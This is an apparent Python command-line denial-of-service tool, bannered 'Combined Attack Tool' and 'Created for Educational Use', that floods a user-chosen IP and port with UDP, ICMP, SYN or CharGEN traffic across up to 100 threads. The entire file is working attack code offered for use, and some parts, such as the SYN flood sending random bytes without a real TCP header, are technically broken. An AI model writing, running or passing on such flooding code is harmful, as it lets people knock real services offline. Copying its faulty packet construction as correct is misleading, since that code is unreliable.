import os
import sys
import socket
import random
import time
from termcolor import colored
from threading import Thread, Lock

# Banner
def show_banner():
    os.system("clear")
    print(colored("""
    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║
   ███████║   ██║      ██║   ███████║██║     ███████║
   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║
   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """, "red"))
    print(colored("*******************************************", "yellow"))
    print(colored("*            Combined Attack Tool         *", "yellow"))
    print(colored("*         Created for Educational Use     *", "yellow"))
    print(colored("*******************************************", "yellow"))
    print(colored("Author: Educational Example", "green"))
    print(colored("Usage of this tool must comply with all laws.", "blue"))
    print()

# Attack Function Template
def execute_attack(ip, port, duration, threads, attack_type, payload=None):
    lock = Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if attack_type in ["udp", "chargen"] else socket.SOCK_RAW)
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                if payload:
                    sock.sendto(payload, (ip, port))
                else:
                    sock.sendto(random._urandom(512), (ip, port))
                with lock:
                    stats["packets_sent"] += 1
            except KeyboardInterrupt:
                break
            except Exception:
                continue

    print(colored(f"Starting {attack_type.upper()} attack on {ip}:{port}", "yellow"))
    thread_list = [Thread(target=attack) for _ in range(threads)]
    for thread in thread_list:
        thread.start()

    # Live statistics
    while any(thread.is_alive() for thread in thread_list):
        with lock:
            print(colored(f"Packets sent: {stats['packets_sent']}", "cyan"), end="\r")
        time.sleep(1)

    for thread in thread_list:
        thread.join()
    print(colored(f"\n{attack_type.upper()} attack completed.", "green"))

# ICMP Attack Function
def icmp_flood(ip, duration, threads):
    lock = Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        payload = b"\x08\x00" + random._urandom(32)  # Echo request with random data
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                sock.sendto(payload, (ip, 0))
                with lock:
                    stats["packets_sent"] += 1
            except KeyboardInterrupt:
                break
            except Exception:
                continue

    print(colored(f"Starting ICMP Flood attack on {ip}", "yellow"))
    thread_list = [Thread(target=attack) for _ in range(threads)]
    for thread in thread_list:
        thread.start()

    # Live statistics
    while any(thread.is_alive() for thread in thread_list):
        with lock:
            print(colored(f"Packets sent: {stats['packets_sent']}", "cyan"), end="\r")
        time.sleep(1)

    for thread in thread_list:
        thread.join()
    print(colored(f"\nICMP Flood attack completed.", "green"))

# SYN Flood Function
def syn_flood(ip, port, duration, threads):
    lock = Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                payload = random._urandom(1024)  # Random SYN packet
                sock.sendto(payload, (ip, port))
                with lock:
                    stats["packets_sent"] += 1
            except KeyboardInterrupt:
                break
            except Exception:
                continue

    print(colored(f"Starting SYN Flood attack on {ip}:{port}", "yellow"))
    thread_list = [Thread(target=attack) for _ in range(threads)]
    for thread in thread_list:
        thread.start()

    # Live statistics
    while any(thread.is_alive() for thread in thread_list):
        with lock:
            print(colored(f"Packets sent: {stats['packets_sent']}", "cyan"), end="\r")
        time.sleep(1)

    for thread in thread_list:
        thread.join()
    print(colored(f"\nSYN Flood attack completed.", "green"))

# Main Function
def main():
    while True:
        show_banner()
        print("1. UDP Flood")
        print("2. ICMP Flood")
        print("3. SYN Flood")
        print("4. CharGEN Flood")
        print("5. Exit")

        choice = input(colored("Select an option: ", "cyan"))

        if choice in ["1", "2", "3", "4"]:
            ip, port, duration = get_target_info()
            threads = get_threads()
            if choice == "1":
                execute_attack(ip, port, duration, threads, "udp")
            elif choice == "2":
                icmp_flood(ip, duration, threads)
            elif choice == "3":
                syn_flood(ip, port, duration, threads)
            elif choice == "4":
                execute_attack(ip, port, duration, threads, "chargen", b"CharGEN Flood Payload")
        elif choice == "5":
            print(colored("Exiting... Goodbye!", "red"))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", "red"))

def get_target_info():
    ip = input(colored("Enter target IP: ", "cyan"))
    port = int(input(colored("Enter target port: ", "cyan")))
    duration = int(input(colored("Enter attack duration (seconds): ", "cyan")))
    return ip, port, duration

def get_threads():
    threads = int(input(colored("Enter number of threads (Max: 100): ", "cyan")))
    return min(threads, 100)

if __name__ == "__main__":
    main()
